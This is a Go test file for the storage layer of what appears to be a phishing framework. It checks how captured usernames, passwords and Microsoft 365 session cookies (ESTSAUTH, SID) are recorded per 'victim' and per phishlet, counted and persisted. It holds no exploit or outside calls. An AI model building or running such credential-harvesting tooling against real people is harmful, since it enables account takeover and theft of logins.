package store

import (
	"os"
	"path/filepath"
	"testing"
	"time"
)

func TestNewStore(t *testing.T) {
	s := NewStore("")
	if s == nil {
		t.Fatal("NewStore returned nil")
	}
	if len(s.victims) != 0 {
		t.Errorf("expected empty victims, got %d", len(s.victims))
	}
}

func TestAddCredential(t *testing.T) {
	s := NewStore("")

	cred := CapturedCredential{
		ID:        "cred-1",
		VictimID:  "victim-1",
		Username:  "user@example.com",
		Password:  "password123",
		SourceIP:  "192.168.1.100",
		UserAgent: "Mozilla/5.0",
		Phishlet:  "microsoft365",
		Timestamp: time.Now(),
	}

	s.AddCredential(cred)

	victims := s.GetAllVictims()
	if len(victims) != 1 {
		t.Fatalf("expected 1 victim, got %d", len(victims))
	}

	v := victims[0]
	if v.ID != "victim-1" {
		t.Errorf("expected victim ID 'victim-1', got %q", v.ID)
	}
	if len(v.Credentials) != 1 {
		t.Fatalf("expected 1 credential, got %d", len(v.Credentials))
	}
	if v.Credentials[0].Username != "user@example.com" {
		t.Errorf("expected username 'user@example.com', got %q", v.Credentials[0].Username)
	}
}

func TestAddSession(t *testing.T) {
	s := NewStore("")

	sess := CapturedSession{
		ID:       "sess-1",
		VictimID: "victim-1",
		Cookies: map[string]string{
			"ESTSAUTH": "token-value-1",
			"SID":      "token-value-2",
		},
		Phishlet:  "microsoft365",
		Timestamp: time.Now(),
		IsValid:   true,
	}

	s.AddSession(sess)

	v, ok := s.GetVictim("victim-1")
	if !ok {
		t.Fatal("victim not found")
	}
	if len(v.Sessions) != 1 {
		t.Fatalf("expected 1 session, got %d", len(v.Sessions))
	}
	if v.Tokens["ESTSAUTH"] != "token-value-1" {
		t.Errorf("expected aggregated token ESTSAUTH, got %q", v.Tokens["ESTSAUTH"])
	}
}

func TestGetStats(t *testing.T) {
	s := NewStore("")

	s.AddCredential(CapturedCredential{ID: "c1", VictimID: "v1", Timestamp: time.Now()})
	s.AddCredential(CapturedCredential{ID: "c2", VictimID: "v1", Timestamp: time.Now()})
	s.AddSession(CapturedSession{ID: "s1", VictimID: "v2", Cookies: map[string]string{"k": "v"}, Timestamp: time.Now()})

	stats := s.GetStats()
	if stats["total_victims"] != 2 {
		t.Errorf("expected 2 victims, got %v", stats["total_victims"])
	}
	if stats["total_credentials"] != 2 {
		t.Errorf("expected 2 credentials, got %v", stats["total_credentials"])
	}
	if stats["total_sessions"] != 1 {
		t.Errorf("expected 1 session, got %v", stats["total_sessions"])
	}
}

func TestReset(t *testing.T) {
	s := NewStore("")
	s.AddCredential(CapturedCredential{ID: "c1", VictimID: "v1", Timestamp: time.Now()})

	s.Reset()

	if len(s.GetAllVictims()) != 0 {
		t.Error("expected 0 victims after reset")
	}
}

func TestPersistence(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "test_store.json")

	s1 := NewStore(path)
	s1.AddCredential(CapturedCredential{
		ID:       "c1",
		VictimID: "v1",
		Username: "persist@test.com",
		Timestamp: time.Now(),
	})

	s2 := NewStore(path)
	v, ok := s2.GetVictim("v1")
	if !ok {
		t.Fatal("victim not found after reload")
	}
	if len(v.Credentials) != 1 {
		t.Fatalf("expected 1 credential after reload, got %d", len(v.Credentials))
	}
	if v.Credentials[0].Username != "persist@test.com" {
		t.Errorf("expected username persist@test.com, got %q", v.Credentials[0].Username)
	}

	os.Remove(path)
}

func TestConcurrentAccess(t *testing.T) {
	s := NewStore("")
	done := make(chan struct{})

	for i := 0; i < 50; i++ {
		go func(id int) {
			defer func() { done <- struct{}{} }()
			cred := CapturedCredential{
				ID:        generateTestID(id),
				VictimID:  "v1",
				Timestamp: time.Now(),
			}
			s.AddCredential(cred)
		}(i)
	}

	for i := 0; i < 50; i++ {
		go func() {
			defer func() { done <- struct{}{} }()
			s.GetAllVictims()
			s.GetStats()
		}()
	}

	for i := 0; i < 100; i++ {
		<-done
	}

	v, ok := s.GetVictim("v1")
	if !ok {
		t.Fatal("victim not found")
	}
	if len(v.Credentials) != 50 {
		t.Errorf("expected 50 credentials, got %d", len(v.Credentials))
	}
}

func generateTestID(n int) string {
	return "test-" + time.Now().Format("150405") + "-" + string(rune('a'+n%26))
}
